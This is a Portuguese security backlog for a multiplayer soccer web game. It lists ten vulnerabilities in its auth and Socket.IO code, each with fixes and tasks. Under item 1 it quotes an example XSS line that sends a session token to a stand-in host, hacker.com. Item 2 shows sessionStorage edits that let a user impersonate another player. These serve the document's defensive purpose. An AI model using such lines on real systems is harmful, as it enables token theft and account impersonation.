# Vulnerabilidades de Segurança - Backlog

**Data de Identificação**: 27 de dezembro de 2025  
**Projeto**: Multiplayer Soccer  
**Status**: 🔴 Pendente de Correção

---

## 📋 Índice

1. [Vulnerabilidades Críticas](#vulnerabilidades-críticas)
2. [Vulnerabilidades Importantes](#vulnerabilidades-importantes)
3. [Melhorias Recomendadas](#melhorias-recomendadas)
4. [Roadmap de Implementação](#roadmap-de-implementação)
5. [Referências Técnicas](#referências-técnicas)

---

## 🔴 Vulnerabilidades Críticas

### 1. Token JWT em sessionStorage (XSS Attack)

**Arquivo**: `public/auth.js` (linha ~37)  
**Severidade**: 🔴 Crítica  
**Status**: Pendente

#### Problema
```javascript
function saveUserData(userId, username, token) {
    sessionStorage.setItem('token', token);  // ❌ Vulnerável a XSS
}
```

**Risco**:
- Qualquer script malicioso na página pode roubar o token
- Extensões de navegador podem acessar sessionStorage
- Ataques XSS podem exfiltrar credenciais

**Exemplo de Ataque**:
```javascript
// Script malicioso injeta:
fetch('https://hacker.com/steal?token=' + sessionStorage.getItem('token'));
```

#### Solução Recomendada
**Backend (Express/authRoutes.ts)**:
```typescript
// Após login/registro bem-sucedido
res.cookie('token', token, {
    httpOnly: true,     // JavaScript não pode acessar
    secure: true,       // Apenas HTTPS
    sameSite: 'strict', // Proteção contra CSRF
    maxAge: 30 * 24 * 60 * 60 * 1000  // 30 dias
});

res.json({
    success: true,
    message: 'Login realizado com sucesso',
    userId: user.id,
    username: user.username
    // NÃO enviar token no body
});
```

**Frontend (auth.js)**:
```javascript
// REMOVER todas as linhas:
sessionStorage.setItem('token', data.token);

// O cookie é automaticamente enviado em requisições subsequentes
```

**Middleware de Autenticação (novo arquivo: middleware/authMiddleware.ts)**:
```typescript
import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';

export function authenticateToken(req: Request, res: Response, next: NextFunction) {
    const token = req.cookies.token;
    
    if (!token) {
        return res.status(401).json({ success: false, message: 'Não autenticado' });
    }
    
    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET!) as any;
        req.user = decoded;
        next();
    } catch (error) {
        return res.status(403).json({ success: false, message: 'Token inválido' });
    }
}
```

#### Tarefas
- [ ] Instalar `cookie-parser`: `npm install cookie-parser @types/cookie-parser`
- [ ] Configurar cookie-parser no Express
- [ ] Modificar `authRoutes.ts` para enviar cookies ao invés de tokens no body
- [ ] Remover `sessionStorage.setItem('token')` de `auth.js`
- [ ] Criar middleware de autenticação
- [ ] Testar fluxo completo de login/logout

---

### 2. Autenticação Socket.IO Fraca (User Impersonation)

**Arquivo**: `public/game.ts` (linha ~550)  
**Severidade**: 🔴 Crítica  
**Status**: Pendente

#### Problema
```typescript
const userId = sessionStorage.getItem('userId');
const username = sessionStorage.getItem('username');

const socket = io('/', {
  query: { 
    userId: isGuest ? '' : (userId || ''),
    username: isGuest ? 'Convidado' : (username || 'Convidado'),
  },
});
```

**Risco**:
- Qualquer pessoa pode abrir DevTools e modificar:
```javascript
sessionStorage.setItem('userId', '999');
sessionStorage.setItem('username', 'AdminFake');
// Recarrega a página e se passa por outro usuário
```
- Permite roubar identidade de outros jogadores
- Permite manipular estatísticas de outros usuários

#### Solução Recomendada

**Frontend (game.ts)**:
```typescript
// Usar token JWT ao invés de userId/username
const token = sessionStorage.getItem('token');  // Temporário até migrar para cookies

const socket = io('/', {
  auth: { token },  // Envia token no handshake
  query: { 
    roomId: state.requestedRoomId || '',
  },
});
```

**Backend (game/socketHandlers.ts)**:
```typescript
import jwt from 'jsonwebtoken';

export function registerSocketHandlers(io: SocketIOServer): void {
    io.use((socket, next) => {
        // Middleware de autenticação Socket.IO
        const token = socket.handshake.auth.token;
        
        if (!token) {
            // Permitir convidados
            socket.data.isGuest = true;
            socket.data.userId = null;
            socket.data.username = `Convidado ${Math.floor(Math.random() * 1000)}`;
            return next();
        }
        
        try {
            const decoded = jwt.verify(token, process.env.JWT_SECRET!) as any;
            socket.data.userId = decoded.userId;
            socket.data.username = decoded.username;
            socket.data.isGuest = false;
            next();
        } catch (error) {
            return next(new Error('Token inválido'));
        }
    });
    
    io.on('connection', (socket) => {
        // Usar socket.data.userId e socket.data.username
        // ao invés de confiar no query parameter
    });
}
```

#### Tarefas
- [ ] Modificar `game.ts` para enviar token no `auth` do Socket.IO
- [ ] Criar middleware de autenticação Socket.IO
- [ ] Refatorar `socketHandlers.ts` para usar `socket.data` autenticado
- [ ] Implementar sessão única: desconectar sessões antigas se o mesmo usuário conectar novamente
- [ ] Testar com usuários autenticados e convidados

---

### 3. Senha Fraca sem Validação (Frontend)

**Arquivo**: `public/auth.js` (linha ~70)  
**Severidade**: 🟠 Alta  
**Status**: Pendente

#### Problema
```javascript
const password = document.getElementById('register-password').value;
// ❌ Nenhuma validação de força de senha
```

**Risco**:
- Usuários podem criar senhas como "123456", "password", "abc"
- Facilita ataques de força bruta
- Não há verificação de complexidade

#### Solução Recomendada

**Frontend (auth.js)**:
```javascript
function validatePassword(password) {
    const errors = [];
    
    if (password.length < 8) {
        errors.push('Mínimo 8 caracteres');
    }
    if (!/[A-Z]/.test(password)) {
        errors.push('Pelo menos uma letra maiúscula');
    }
    if (!/[a-z]/.test(password)) {
        errors.push('Pelo menos uma letra minúscula');
    }
    if (!/[0-9]/.test(password)) {
        errors.push('Pelo menos um número');
    }
    if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) {
        errors.push('Pelo menos um caractere especial');
    }
    
    return errors;
}

// No handler de registro:
const passwordErrors = validatePassword(password);
if (passwordErrors.length > 0) {
    showMessage('Senha fraca: ' + passwordErrors.join(', '), 'error');
    return;
}
```

**Backend (services/authService.ts)** - Validação dupla:
```typescript
static validatePassword(password: string): string[] {
    const errors: string[] = [];
    
    if (password.length < 8) errors.push('Mínimo 8 caracteres');
    if (!/[A-Z]/.test(password)) errors.push('Letra maiúscula obrigatória');
    if (!/[a-z]/.test(password)) errors.push('Letra minúscula obrigatória');
    if (!/[0-9]/.test(password)) errors.push('Número obrigatório');
    if (!/[!@#$%^&*]/.test(password)) errors.push('Caractere especial obrigatório');
    
    return errors;
}

static async register(username: string, password: string): Promise<AuthResponse> {
    // Validar senha
    const passwordErrors = this.validatePassword(password);
    if (passwordErrors.length > 0) {
        return {
            success: false,
            message: 'Senha inválida: ' + passwordErrors.join(', ')
        };
    }
    
    // resto do código...
}
```

#### Tarefas
- [ ] Criar função `validatePassword()` no frontend
- [ ] Adicionar validação no evento de submit do registro
- [ ] Mostrar requisitos de senha na UI
- [ ] Implementar validação duplicada no backend
- [ ] Adicionar indicador visual de força de senha (opcional)

---

## 🟡 Vulnerabilidades Importantes

### 4. HTTPS não Obrigatório

**Arquivo**: `public/auth.js` e `public/game.ts`  
**Severidade**: 🟠 Alta (em produção)  
**Status**: Pendente

#### Problema
```javascript
await fetch('/api/auth/login', {  // ❌ Pode ser HTTP
    // Senhas trafegam em texto claro se não usar HTTPS
});
```

**Risco**:
- Man-in-the-Middle (MitM) em redes públicas
- Senhas e tokens interceptáveis
- Sessões podem ser roubadas

#### Solução Recomendada

**Frontend (auth.js e game.ts)**:
```javascript
// No início do arquivo
function enforceHttps() {
    if (window.location.protocol !== 'https:' && 
        window.location.hostname !== 'localhost' &&
        window.location.hostname !== '127.0.0.1') {
        alert('⚠️ Conexão insegura! Redirecionando para HTTPS...');
        window.location.href = 'https://' + window.location.host + window.location.pathname;
    }
}

// Chamar na inicialização
window.addEventListener('DOMContentLoaded', enforceHttps);
```

**Backend (Express/game-server.ts)**:
```typescript
// Middleware para redirecionar HTTP -> HTTPS
app.use((req, res, next) => {
    if (process.env.NODE_ENV === 'production' && !req.secure) {
        return res.redirect('https://' + req.headers.host + req.url);
    }
    next();
});

// Header de segurança
app.use((req, res, next) => {
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    next();
});
```

**Nginx (nginx/default.conf)**:
```nginx
# Redirecionar HTTP para HTTPS
server {
    listen 80;
    server_name seu-dominio.com;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name seu-dominio.com;
    
    ssl_certificate /etc/ssl/certs/seu-certificado.crt;
    ssl_certificate_key /etc/ssl/private/sua-chave.key;
    
    # Resto da configuração...
}
```

#### Tarefas
- [ ] Adicionar verificação HTTPS no frontend
- [ ] Configurar middleware de redirecionamento no Express
- [ ] Obter certificado SSL (Let's Encrypt)
- [ ] Configurar Nginx com SSL/TLS
- [ ] Testar redirecionamentos HTTP -> HTTPS
- [ ] Adicionar HSTS header

---

### 5. Rate Limiting Ausente (Brute Force e DoS)

**Arquivos**: `public/auth.js` (login) e `public/game.ts` (socket inputs)  
**Severidade**: 🟡 Média  
**Status**: Pendente

#### Problema

**auth.js**:
```javascript
document.getElementById('loginForm')?.addEventListener('submit', async (e) => {
    // ❌ Pode enviar infinitas requisições de login
});
```

**game.ts**:
```typescript
setInterval(() => {
    socket.emit('input', state.inputs);  // 60 vezes por segundo
}, 1000 / 60);
```

**Risco**:
- Ataques de força bruta no login
- DoS bombardeando o servidor com requisições
- Cliente modificado pode enviar milhares de inputs/segundo

#### Solução Recomendada

**Frontend (auth.js)** - Rate limiting básico:
```javascript
let loginAttempts = 0;
let lastAttempt = 0;
const MAX_ATTEMPTS = 5;
const COOLDOWN_MS = 60000; // 1 minuto

document.getElementById('loginForm')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const now = Date.now();
    
    // Resetar contador após cooldown
    if (now - lastAttempt > COOLDOWN_MS) {
        loginAttempts = 0;
    }
    
    // Verificar tentativas
    if (loginAttempts >= MAX_ATTEMPTS) {
        const waitTime = Math.ceil((COOLDOWN_MS - (now - lastAttempt)) / 1000);
        showMessage(`Muitas tentativas. Aguarde ${waitTime} segundos.`, 'error');
        return;
    }
    
    lastAttempt = now;
    loginAttempts++;
    
    // Resto do código...
});
```

**Backend (routes/authRoutes.ts)** - Express Rate Limit:
```typescript
import rateLimit from 'express-rate-limit';

// Rate limiter para rotas de autenticação
const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 5, // 5 tentativas por IP
    message: {
        success: false,
        message: 'Muitas tentativas de login. Tente novamente em 15 minutos.'
    },
    standardHeaders: true,
    legacyHeaders: false,
});

router.post('/login', authLimiter, async (req, res) => {
    // Handler de login...
});

router.post('/register', authLimiter, async (req, res) => {
    // Handler de registro...
});
```

**Backend (game/socketHandlers.ts)** - Socket Rate Limit:
```typescript
import { RateLimiterMemory } from 'rate-limiter-flexible';

const inputLimiter = new RateLimiterMemory({
    points: 100, // 100 inputs
    duration: 1, // por segundo
});

export function registerSocketHandlers(io: SocketIOServer): void {
    io.on('connection', (socket) => {
        socket.on('input', async (inputData) => {
            try {
                await inputLimiter.consume(socket.id);
                // Processar input...
            } catch {
                socket.emit('rateLimit', { message: 'Muitos inputs. Desacelere.' });
                return;
            }
        });
    });
}
```

#### Tarefas
- [ ] Instalar dependências: `npm install express-rate-limit rate-limiter-flexible`
- [ ] Implementar rate limiting no frontend (auth.js)
- [ ] Configurar express-rate-limit nas rotas de autenticação
- [ ] Implementar rate limiter para Socket.IO inputs
- [ ] Testar limites e ajustar thresholds
- [ ] Adicionar logs de tentativas bloqueadas

---

### 6. Room Hijacking (Acesso Não Autorizado a Salas)

**Arquivo**: `public/game.ts` (linha ~330)  
**Severidade**: 🟡 Média  
**Status**: Pendente

#### Problema
```typescript
function persistRoomInUrl(roomId: string): void {
    params.set('room', roomId);
    // ❌ Qualquer um pode manipular ?room=xyz e entrar em salas privadas
}
```

**Risco**:
- Usuários podem descobrir IDs de salas e entrar sem convite
- Não há controle de acesso a salas privadas
- Possível espionagem de partidas

#### Solução Recomendada (Salas Privadas)

**Backend (game/roomManager.ts)** - Adicionar autenticação de sala:
```typescript
interface Room {
    // ... campos existentes
    isPrivate: boolean;
    password?: string;  // Hash bcrypt
    allowedUsers?: string[];  // Lista de userIds permitidos
    inviteToken?: string;  // Token único para convites
}

export function createRoom(roomId: string, isPrivate: boolean = false): Room {
    const room: Room = {
        // ... inicialização existente
        isPrivate,
        inviteToken: isPrivate ? generateInviteToken() : undefined,
    };
    rooms.set(roomId, room);
    return room;
}

function generateInviteToken(): string {
    return crypto.randomBytes(16).toString('hex');
}

export function canJoinRoom(room: Room, userId: string, inviteToken?: string): boolean {
    if (!room.isPrivate) return true;
    
    if (room.allowedUsers?.includes(userId)) return true;
    
    if (inviteToken && inviteToken === room.inviteToken) {
        // Adiciona usuário à lista permitida
        if (!room.allowedUsers) room.allowedUsers = [];
        room.allowedUsers.push(userId);
        return true;
    }
    
    return false;
}
```

**Backend (game/socketHandlers.ts)**:
```typescript
io.on('connection', (socket) => {
    const roomId = socket.handshake.query.roomId as string;
    const inviteToken = socket.handshake.query.inviteToken as string;
    const userId = socket.data.userId;
    
    const room = rooms.get(roomId);
    
    if (room && !canJoinRoom(room, userId, inviteToken)) {
        socket.emit('roomDenied', { 
            message: 'Você não tem permissão para entrar nesta sala.' 
        });
        socket.disconnect();
        return;
    }
    
    // Resto do código...
});
```

**Frontend (game.ts)** - Suporte a convites:
```typescript
// Detectar invite token na URL
function getInviteToken(): string | null {
    const params = new URLSearchParams(window.location.search);
    return params.get('invite');
}

const socket = io('/', {
    auth: { token },
    query: { 
        roomId: state.requestedRoomId || '',
        inviteToken: getInviteToken() || '',
    },
});

socket.on('roomDenied', (data) => {
    alert(data.message);
    window.location.href = '/';  // Redireciona para home
});
```

#### Tarefas
- [ ] Adicionar campos `isPrivate`, `password`, `allowedUsers` ao Room
- [ ] Implementar função `canJoinRoom()` no roomManager
- [ ] Modificar socketHandlers para verificar permissões
- [ ] Criar sistema de convites com tokens únicos
- [ ] Adicionar UI para criar salas privadas
- [ ] Testar acesso autorizado e negado

---

## 🟢 Melhorias Recomendadas

### 7. Validação de Dados do Servidor

**Arquivo**: `public/game.ts` (handlers Socket.IO)  
**Severidade**: 🟢 Baixa  
**Status**: Pendente

#### Problema
```typescript
update: (newState: UpdateData) => {
    state.gameState = { ...state.gameState, ...newState };
    // ❌ Confia cegamente nos dados do servidor
}
```

**Risco**:
- Se o servidor for comprometido, pode enviar dados maliciosos
- Man-in-the-Middle pode injetar dados inválidos
- Falta de sanitização pode causar bugs no cliente

#### Solução Recomendada
```typescript
function validateGameState(data: any): boolean {
    if (typeof data.matchTime !== 'number') return false;
    if (data.matchTime < 0 || data.matchTime > 999) return false;
    
    if (typeof data.score?.red !== 'number') return false;
    if (typeof data.score?.blue !== 'number') return false;
    if (data.score.red < 0 || data.score.blue < 0) return false;
    
    if (typeof data.ball?.x !== 'number') return false;
    if (typeof data.ball?.y !== 'number') return false;
    
    return true;
}

const socketHandlers = {
    update: (newState: UpdateData) => {
        if (!validateGameState(newState)) {
            console.error('Dados inválidos recebidos do servidor');
            return;
        }
        state.gameState = { ...state.gameState, ...newState };
        // ...
    }
};
```

#### Tarefas
- [ ] Criar função `validateGameState()`
- [ ] Adicionar validações em todos os handlers Socket.IO
- [ ] Sanitizar strings (usernames) para evitar XSS
- [ ] Logar dados inválidos para debug
- [ ] Considerar usar biblioteca de validação (Zod, Yup)

---

### 8. Limpeza de Campos Sensíveis

**Arquivo**: `public/auth.js` (linhas ~60, ~95)  
**Severidade**: 🟢 Baixa  
**Status**: Pendente

#### Problema
```javascript
// Após login, senhas permanecem no DOM
const password = document.getElementById('login-password').value;
```

**Risco**:
- Senhas ficam na memória do DOM
- Podem ser acessadas via DevTools
- Podem aparecer em dumps de memória

#### Solução Recomendada
```javascript
if (data.success) {
    // Limpa campos de senha imediatamente
    document.getElementById('login-password').value = '';
    document.getElementById('register-password').value = '';
    document.getElementById('register-password-confirm').value = '';
    
    saveUserData(data.userId, data.username, data.token);
    showMessage('Login realizado com sucesso! Redirecionando...', 'success');
    setTimeout(redirectToGame, 1500);
}
```

#### Tarefas
- [ ] Adicionar limpeza de campos após login
- [ ] Adicionar limpeza após registro
- [ ] Limpar em caso de erro também (boa prática)

---

### 9. Timeout em Requisições

**Arquivo**: `public/auth.js` e `public/game.ts`  
**Severidade**: 🟢 Baixa  
**Status**: Pendente

#### Problema
```javascript
const response = await fetch('/api/auth/login', {
    // ❌ Sem timeout - pode ficar pendente indefinidamente
});
```

**Risco**:
- Requisições podem travar a UI
- Não há feedback para o usuário
- Pode causar múltiplas requisições duplicadas

#### Solução Recomendada
```javascript
async function fetchWithTimeout(url, options, timeout = 10000) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout);
    
    try {
        const response = await fetch(url, {
            ...options,
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        return response;
    } catch (error) {
        clearTimeout(timeoutId);
        if (error.name === 'AbortError') {
            throw new Error('Timeout: Servidor não respondeu');
        }
        throw error;
    }
}

// Uso:
try {
    const response = await fetchWithTimeout('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
    }, 10000);  // 10 segundos
} catch (error) {
    showMessage(error.message, 'error');
}
```

#### Tarefas
- [ ] Criar função `fetchWithTimeout()`
- [ ] Substituir todos os `fetch()` por `fetchWithTimeout()`
- [ ] Adicionar feedback visual de loading
- [ ] Testar com conexões lentas

---

### 10. Proteção CSRF para Cookies

**Arquivo**: Novo middleware (quando implementar cookies httpOnly)  
**Severidade**: 🟢 Baixa (após migrar para cookies)  
**Status**: Futuro

#### Problema
Quando usar cookies httpOnly, precisa de proteção CSRF.

#### Solução Recomendada

**Backend (game-server.ts)**:
```typescript
import csrf from 'csurf';
import cookieParser from 'cookie-parser';

app.use(cookieParser());
app.use(csrf({ cookie: true }));

app.get('/api/csrf-token', (req, res) => {
    res.json({ csrfToken: req.csrfToken() });
});

// Rotas protegidas automaticamente
```

**Frontend**:
```javascript
// Buscar token CSRF antes de fazer requisições
let csrfToken = '';

async function getCsrfToken() {
    const res = await fetch('/api/csrf-token');
    const data = await res.json();
    csrfToken = data.csrfToken;
}

// Incluir em requisições POST
await fetch('/api/auth/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({ username, password })
});
```

#### Tarefas
- [ ] Instalar `csurf`: `npm install csurf @types/csurf`
- [ ] Configurar middleware CSRF
- [ ] Criar endpoint `/api/csrf-token`
- [ ] Modificar frontend para buscar e enviar token
- [ ] Testar proteção CSRF

---

## 📅 Roadmap de Implementação

### Fase 1: Crítico (Sprint 1 - 1 semana)
- [ ] **#1**: Migrar tokens para httpOnly cookies
- [ ] **#2**: Implementar autenticação JWT no Socket.IO
- [ ] **#3**: Adicionar validação de senha (frontend + backend)

### Fase 2: Importante (Sprint 2 - 1 semana)
- [ ] **#4**: Configurar HTTPS obrigatório em produção
- [ ] **#5**: Implementar rate limiting (Express + Socket.IO)
- [ ] **#6**: Sistema de salas privadas com autenticação

### Fase 3: Melhorias (Sprint 3 - 3 dias)
- [ ] **#7**: Validação de dados recebidos do servidor
- [ ] **#8**: Limpeza de campos sensíveis
- [ ] **#9**: Timeout em requisições HTTP

### Fase 4: Refinamento (Sprint 4 - 2 dias)
- [ ] **#10**: Proteção CSRF (após cookies httpOnly)
- [ ] Testes de penetração
- [ ] Auditoria de segurança completa
- [ ] Documentação final

---

## 📚 Referências Técnicas

### Segurança Web
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)

### Node.js Security
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
- [Socket.IO Authentication](https://socket.io/docs/v4/middlewares/)

### JWT & Authentication
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

### Rate Limiting
- [express-rate-limit](https://www.npmjs.com/package/express-rate-limit)
- [rate-limiter-flexible](https://www.npmjs.com/package/rate-limiter-flexible)

### HTTPS/SSL
- [Let's Encrypt](https://letsencrypt.org/)
- [SSL Labs Server Test](https://www.ssllabs.com/ssltest/)
- [Mozilla SSL Configuration Generator](https://ssl-config.mozilla.org/)

---

## 📝 Notas Importantes

### Priorização
As vulnerabilidades foram priorizadas por:
1. **Severidade**: Impacto potencial em caso de exploração
2. **Facilidade de Exploração**: Quão fácil é explorar a vulnerabilidade
3. **Probabilidade**: Chance de ocorrer em produção

### Testes Necessários
Após cada correção, realizar:
- ✅ Testes funcionais (fluxo normal continua funcionando)
- ✅ Testes de segurança (tentativas de bypass)
- ✅ Testes de performance (rate limiting não impacta usuários legítimos)
- ✅ Testes de regressão (outras funcionalidades não quebram)

### Ambiente de Desenvolvimento
- Algumas proteções (HTTPS obrigatório) podem ser relaxadas em `localhost`
- Sempre testar em ambiente de staging antes de produção
- Usar variáveis de ambiente diferentes para dev/staging/prod

---

**Última Atualização**: 27 de dezembro de 2025  
**Próxima Revisão**: Após implementação da Fase 1
